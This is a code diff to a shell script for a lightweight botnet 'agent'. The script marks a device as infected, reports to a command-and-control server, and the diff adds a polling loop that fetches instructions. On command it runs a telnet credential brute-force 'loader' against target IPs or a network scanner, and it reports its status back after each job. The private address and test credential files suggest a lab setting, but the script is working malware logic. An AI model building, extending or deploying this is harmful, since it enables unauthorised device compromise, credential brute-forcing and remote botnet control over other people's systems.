@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 # this is my attempt at a super lightweight agent that doesn't need C binaries or python interpreter and dependencies
 
@@ -15,20 +15,28 @@ if [ ! -e $INFECTED ]; then
 	# curl other necessary payloads...
 
 	chmod +x loader
+	chmod +x scanner
 	touch /tmp/infected # signal this device as infected with all the payloads
 	curl -X POST http://172.18.0.1:8000/infected?device_id="$ID"
 fi
 
-# while true; do # TODO: fix inside of loop
-#	curl -f http://172.18.0.1:8001/inst -o inst
-#	INSTRUCTION=$(cat inst)
-#	case $INSTRUCTION in
-#		Load)
-#			curl -X POST http://172.18.0.1:8001/status # something like this to let the control know we are executing
-#			curl http://172.18.0.1:8001/target -o target # realistically the target will be in the inst, and we will regex the inst
-#			./loader $(cat target) 23 users.txt passwords.txt 20 # the loader will be modified to report back soon
-#			;;
-#		*) # other instructions
-#			;;
-#	sleep 30
-#done
+while true; do # TODO: fix inside of loop
+	curl -f http://172.18.0.1:8000/inst?device_id="$ID" -o inst
+	INSTRUCTION=$(cat inst)
+	echo $INSTRUCTION
+	read CMD IP MASK <<< "$INSTRUCTION"
+	if [[ "$CMD" == "none" ]]; then
+		:
+	elif [[ "$CMD" == "load" ]]; then
+		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=1"
+		./loader "$IP" 23 testuser.txt testpass.txt 10
+		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=0"
+		curl -X POST "http://172.18.0.1:8000/inst?device_id="$ID"&status=1"
+	elif [[ "$CMD" == "scan" ]]; then
+		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=1"
+		./scanner "$IP" "$MASK"
+		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=0"
+		curl -X POST "http://172.18.0.1:8000/inst?device_id="$ID"&status=1"
+	fi
+	sleep 10
+done
